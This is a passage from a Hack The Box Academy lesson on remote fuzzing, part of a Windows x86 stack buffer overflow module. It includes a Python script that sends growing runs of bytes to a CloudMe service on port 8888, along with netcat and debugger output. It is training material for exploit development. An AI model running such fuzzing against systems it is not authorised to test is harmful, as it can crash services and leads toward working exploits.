<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/89/section/950
// Platform Version: V1
// Module ID: 89
// Module Name: Stack-Based Buffer Overflows on Windows x86
// Module Difficulty: Medium
// Section ID: 950
// Section Title: Remote Fuzzing
// Page Title: Hack The Box - Academy
// Page Number: 08
-->

# Remote Fuzzing

**Module Name:** Stack-Based Buffer Overflows on Windows x86 **Page Number:** 08

#### 

#### STACK-BASED BUFFER OVERFLOWS ON WINDOWS X86

# Remote Fuzzing

## Debugging A Remote Program

``` powershell-session
PS C:\htb> netstat -a

...SNIP...
TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
[CloudMe.exe]
```

``` powershell-session
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
?
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
help
```

## Fuzzing Remote Port

``` python
import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

def fuzz():
    for i in range(0,10000,500):
        buffer = b"A"*i
        print("Fuzzing %s bytes" % i)
```

``` python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
```

``` python
def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```

``` cmd-session
Fuzzing 0 bytes
Fuzzing 500 bytes
...SNIP...
Fuzzing 9000 bytes
Fuzzing 9500 bytes
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_remote_fuzz.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_fuzz.jpg)

## Gradual Fuzzing

``` cmd-session
Fuzzing 0 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(13)fuzz()
-> s.send(buffer)
(Pdb) c
Fuzzing 500 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(12)fuzz()
-> breakpoint()
(Pdb) c
Fuzzing 1000 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(13)fuzz()
-> s.send(buffer)
(Pdb) c
Fuzzing 1500 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(12)fuzz()
-> breakpoint()
(Pdb) c
...
```

# 

# 

#### Questions

####